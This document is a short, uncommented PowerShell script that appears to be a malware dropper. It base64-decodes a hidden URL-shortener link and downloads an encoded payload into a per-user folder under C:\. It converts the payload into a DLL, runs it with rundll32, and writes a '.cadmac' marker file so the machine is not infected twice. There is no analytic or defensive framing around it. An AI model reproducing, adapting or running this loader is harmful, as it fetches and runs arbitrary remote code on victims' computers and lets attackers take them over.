[Reflection.Assembly]::LoadWithPartialName("System.Security")
$progressPreference = 'silentlyContinue'
$pathLocal = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)
foreach($item in [System.IO.Directory]::GetFiles($pathLocal)){
if($item -like "*.cadmac*"){
[Environment]::Exit(1)
}
}
function Decrypt-String($String){
$retorno = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($String))
return $retorno
}
$encryptedUri = "aHR0cHM6Ly9pcy5nZC9FOUw0MHo="
$dencryptedUri = Decrypt-String $encryptedUri
$encryptedPath = "Qzpc"
$dencryptedPath = Decrypt-String $encryptedPath
$dencryptedPath = $dencryptedPath + [Environment]::UserName
[System.IO.Directory]::CreateDirectory($dencryptedPath)
$dencryptedPath = $dencryptedPath + "\" + [Environment]::UserName + ".txt"
Invoke-WebRequest $dencryptedUri -OutFile $dencryptedPath
$tempbytes = [System.Convert]::FromBase64String([System.IO.File]::ReadAllText($dencryptedPath))
$dencryptedPath = $dencryptedPath -replace ".txt", ".dll"
[System.IO.File]::WriteAllBytes($dencryptedPath, $tempbytes)
rundll32.exe "$dencryptedPath,first"
$dencryptedUriCount = Decrypt-String $encryptedUriCount
$dencryptedPath = $dencryptedPath -replace ".dll", ".txt"
$pathLocal = $pathLocal + "\.cadmac"
[System.IO.File]::WriteAllText($pathLocal, "")
Remove-Item $dencryptedPath